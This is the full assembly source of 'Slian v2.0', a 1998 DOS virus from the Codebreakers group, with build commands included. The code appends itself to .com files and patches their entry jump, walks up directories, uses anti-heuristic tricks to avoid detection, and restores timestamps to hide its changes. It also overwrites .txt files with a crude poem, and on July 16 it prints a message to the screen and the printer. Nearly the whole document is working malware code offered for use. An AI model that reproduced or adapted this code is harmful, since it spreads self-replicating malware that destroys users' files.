; ------------------------------------------------------------------------- ;
;           Slian v2.0 coded by KilJaeden of the Codebreakers 1998          ;
; ------------------------------------------------------------------------- ;
; Description:                                                              ;
;                                                                           ;
; v1.0 - start with *.com appender - great tutorials Horny Toad! CB #1,2,3  ;
; v1.1 - add a anti-heuristic loop - Ars0nic's article in Codebreakers #3   ;
; v1.2 - add no bigger, no smaller - Opic's Virus-Addons article in CB #3   ;
; v1.3 - add directory transversal - thankz to SPo0ky / Opic for this :)    ;
; v1.4 - add date activated p-load - Opic's Virus-Addons article in CB #3   ;
; v1.5 - add *.txt file overwriter - great tutorials Horny Toad! CB #1,2,3  ;
; v1.6 - optimize my code a little - thanks Opic :)                         ;
; v1.7 - add anti-heuristic tricks - Ars0nic's article in Codebreakers #3   ;
; v1.8 - add appending of any file - Sea4's Nautilus Virus                  ;
; v1.9 - add overwrite of any file - thanks again Sea4 hehe                 ;
; v2.0 - add date/time restoration - thankz again Opic man :)               ;
; ------------------------------------------------------------------------- ;
; -----------> Dedicated to Christine Moore, I'll be back soon! <---------- ;
; ------------------------------------------------------------------------- ;
; to compile ::] tasm slian.asm                                             ;
; to link :::::] tlink /t slian.obj                                         ;
; ------------------------------------------------------------------------- ;

code    segment                         ; name our segment "code"
        assume  cs:code,ds:code         ; assign cs and ds to code
        org     100h                    ; a .com file

start:
        db      0e9h,0,0                ; define a blank jump

real_start:
        mov     cx,0ffffh               ; from other anti-heuristics

anti_one:
        jmp     anti_two                ; jump to anti two
        mov     ax,4c00h                ; terminate program
        call    do_it                   ; make it so DOS!

anti_two:
        loop    anti_one                ; loop anti_one

;call_delta:
        call    get_delta               ; push IP on to stack

get_delta:
        pop     bp                      ; pop it into bp
        sub     bp,offset get_delta     ; get the delta offset

;first_three:
        mov     cx,3                    ; counter set to three
        lea     si,[bp+offset thrbyte]  ; where to write them
        mov     di,100h                 ; start address
        push    di                      ; save it for retn
        rep     movsb                   ; do until cx = 0

;move_dta:
        lea     dx,[bp+offset dta]      ; where to move it
        mov     ah,1ah                  ; move the dta
        call    do_it                   ; make it so DOS!

get_one:
        mov     ah,4eh                  ; find first file
        lea     dx,[bp+comfile]         ; load *.com
        mov     cx,7                    ; all attributes

next:
        call    do_it                   ; make it so DOS!
        jnc     open_file               ; found one? open it
        jmp     find_txt                ; no .com left? .txt now

next_dir:
        lea     dx,[bp+dot_dot]         ; load effective address ..
        mov     ah,3bh                  ; directory changing
        call    do_it                   ; make it so DOS!
        jnc     get_one                 ; and find first again
        jmp     pld_chk                 ; hit root, payload time?

open_file:
        lea     dx,[bp+dta+1eh]         ; filename in DTA
        mov     ax,4301h                ; set file attributes
        xor     cx,cx                   ; to absolutely none
        call    do_it                   ; make it so DOS!

        mov     ax,3d02h                ; open the file read/write
        lea     dx,[bp+offset dta+1eh]  ; get the file name info
        call    do_it                   ; make it so DOS!
        xchg    ax,bx                   ; move the file info

        mov     ax,5700h                ; get time/date stamps
        call    do_it                   ; make it so  DOS!
        mov     [bp+time_cm],dx         ; save the values here
        mov     [bp+date_cm],cx         ; save the values here

;record_three:
        mov     ah,3fh                  ; the read / record function
        lea     dx,[bp+thrbyte]         ; where to record too
        mov     cx,3                    ; how much to record
        call    do_it                   ; make it so DOS!

;file_check:
        mov     ax,word ptr [bp+dta+1ah]        ; get file size
        mov     cx,word ptr [bp+thrbyte+1]      ; get three bytes
        add     cx,finished-real_start+3        ; get virus and jump size
        cmp     ax,cx                           ; compare the two
        jz      close_file                      ; if equal, close file

;too_big:
        cmp     word ptr [bp+dta+1ah],61440     ; > then 61440d bytes?
        jna     too_small                       ; not too big, too small?
        jmp     close_file                      ; too big, close it up

too_small:
        cmp     word ptr [bp+dta+1ah],1024      ; < then 1024d bytes?
        jnb     new_jump                        ; not too small, continue
        jmp     close_file                      ; too small, close it up

new_jump:
        sub     ax,3                            ; file size - 3 bytes
        mov     word ptr [bp+newjump+1],ax      ; write as new jump

;point_to_begin:
        mov     ax,4200h                ; point to start of file
        xor     cx,cx                   ; cx to 0
        xor     dx,dx                   ; dx to 0
        call    do_it                   ; make it so DOS!

;write_jump:
        mov     ah,40h                  ; write to file
        mov     cx,3                    ; three bytes
        lea     dx,[bp+newjump]         ; write this
        call    do_it                   ; make it so DOS!

;point_to_end:
        mov     ax,4202h                ; point to end of file
        xor     cx,cx                   ; cx to 0
        xor     dx,dx                   ; dx to 0
        call    do_it                   ; make it so DOS!

;write_body:
        mov     ah,40h                  ; write to file
        lea     dx,[bp+real_start]      ; what to write
        mov     cx,finished-real_start  ; how much to write
        call    do_it                   ; make it so DOS!

close_file:
        mov     ax,5701h                ; restore time/date stamps
        mov     dx,[bp+time_cm]         ; from this value
        mov     cx,[bp+date_cm]         ; and this value
        call    do_it                   ; make it so DOS!

        mov     ah,3eh                  ; close up the file
        call    do_it                   ; make it so DOS!

;next_file:
        mov     ah,4fh                  ; find next file
        jmp     next                    ; and jump to next

find_txt:
        mov     dx,80h                  ; move DTA to here
        mov     ah,1ah                  ; move the DTA
        call    do_it                   ; make it so DOS!
        mov     ah,4eh                  ; find first file
        xor     cx,cx                   ; cx to 0
        lea     dx,txtfile              ; load *.txt address

next_txt:
        call    do_it                   ; make it so DOS!
        jnc     open_txt                ; found a .txt? open it
        jmp     next_dir                ; none found? next directory

open_txt:
        mov     dx,9eh                  ; filename in DTA
        mov     ax,4301h                ; set file attributes
        xor     cx,cx                   ; to absolutely none
        call    do_it                   ; make it so DOS!

        mov     ax,3d02h                ; all file attributes
        mov     dx,9eh                  ; get the file name info
        call    do_it                   ; make it so DOS!
        xchg    bx,ax                   ; move the file info

        mov     ax,5700h                ; get time/date stamps
        call    do_it                   ; make it so  DOS!
        mov     [bp+time_tx],dx         ; save the values here
        mov     [bp+date_tx],cx         ; save the values here

;infect_txt:                             
        mov     ah,40h                  ; write to file
        lea     dx,txt_start            ; where to start
        mov     cx,txt_end-txt_start    ; how much to write
        call    do_it                   ; make it so DOS!

;close_txt:
        mov     ax,5701h                ; restore time/date stamps
        mov     dx,[bp+time_tx]         ; from this value
        mov     cx,[bp+date_tx]         ; and this value
        call    do_it                   ; make it so DOS!

        mov     ah,3eh                  ; close the file
        call    do_it                   ; make it so DOS!

;find_next:
        mov     ah,4fh                  ; find next .txt file
        jmp     next_txt                ; and go again

end_virus:
        retn                            ; return control to host

pld_chk:
        mov     ah,2ah                  ; get system date
        call    do_it                   ; make it so DOS!
        cmp     dh,07                   ; is it July?
        je      day_chk                 ; yes it is, check day now
        jmp     end_virus               ; nope, end virus

day_chk:
        cmp     dl,16                   ; is it the 16th?
        je      payload                 ; woohoo payload time!
        jmp     end_virus               ; nope, end virus

payload:
        mov     ah,09h                  ; print a message to screen
        lea     dx,[bp+pld_msg]         ; the message
        call    do_it                   ; make it so DOS!
        mov     ah,01h                  ; start printer <grin>
        mov     dx,0h                   ; put 0h into dx
        int     17h                     ; printer int
        lea     si,string1              ; where to start
        mov     cx,endstring1-string1   ; how much to write

print_message:
        mov     ah,00h                  ; write characters
        lodsb                           ; load a byte
        int     17h                     ; printer int
        loop    print_message           ; loop until done
        jmp     end_virus               ; and end the virus

do_it:
        int     21h                     ; make it so DOS!
        ret                             ; return from call

;data_area:
        txt_start:
                db '',10
                db 'Need you, Dream you',10
                db 'Find you, Taste you',10
                db 'Fuck you, Use you',10
                db 'Scar you, Break you',10
                db 'Lose me, Hate me',10
                db 'Smash me, Erase me',10
                db '',10
        txt_end:

        string1:
        pld_msg db '',10,13
                db 'Happy Birthday Christine!',10,13
                db 'Your As Beautiful As Ever',10,13,'$'
        endstring1:

        time_cm dw 0h                   ; .com time stamp goes here
        time_tx dw 0h                   ; .txt time stamp goes here
        date_cm dw 0h                   ; .com date stamp goes here
        date_tx dw 0h                   ; .txt date stamp goes here
        dot_dot db "..",0               ; define the .. string
        comfile db "*.c*",0             ; define the *.com string
        txtfile db "*.tx*",0            ; define the *.txt string
        thrbyte db 0cdh,20h,0           ; terminates on first run
        newjump db 0e9h,0,0             ; blank jump on first run
        finished label near             ; an offset label
        dta db 42 dup (?)               ; set up space for DTA
        code    ends                    ; end code segment
        end     start                   ; end / where to start

; ------------------------------------------------------------------------- ;
; ----------> How Can You Think Freely In The Shadow Of A Church <--------- ;
; ------------------------------------------------------------------------- ;

